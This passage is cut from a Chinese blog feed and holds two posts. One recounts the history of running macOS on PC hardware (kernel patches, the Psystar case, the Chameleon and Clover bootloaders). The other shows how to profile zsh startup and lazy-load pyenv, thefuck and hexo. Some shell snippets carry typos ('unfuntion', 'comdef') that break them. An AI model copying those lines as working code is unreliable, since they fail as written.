Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span 